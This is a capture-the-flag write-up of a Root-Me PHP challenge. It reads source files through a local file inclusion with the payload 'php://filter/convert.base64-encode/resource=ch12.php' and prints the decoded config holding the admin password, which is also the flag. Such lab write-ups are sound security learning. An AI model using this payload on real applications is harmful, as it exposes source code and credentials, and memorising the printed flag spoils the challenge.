
##### Challenge Description

Retrieve the administrator password of this application.

https://repository.root-me.org/Programmation/PHP/EN%20-%20Using%20and%20understanding%20PHP%20streams%20and%20filters.pdf


### Test the Security 

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260308141003.png)

###### What does includes do ? 

La fonction `include()` permet d'insérer et d'exécuter le contenu d'un fichier externe directement dans le script PHP en cours. C'est un outil très pratique pour réutiliser le même morceau de code, comme un menu ou une configuration, sur plusieurs pages différentes sans avoir à le recopier.


### Find the Flag :

https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/Wrappers/#wrapper-phpfilter

Then, 

To get the source code, I need to add this payload to be able to see the page source of the ch12.php :


```
php://filter/convert.base64-encode/resource=ch12.php
```

Full Url :

```
/web-serveur/ch12/index.php?inc=php://filter/convert.base64-encode/resource=ch12.php
```


##### But How do I know that the source code is in ch12.php :
In fact, when there is an error we can see the path here :

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260308143140.png)


After Deconding it ; 


![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260308140722.png)



When I enter the config.php file and I see at the decoded version :

```
<?php
$username="admin";
$password="DAPt9D2mky0APAF";
```


![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260308140706.png)

Flag : DAPt9D2mky0APAF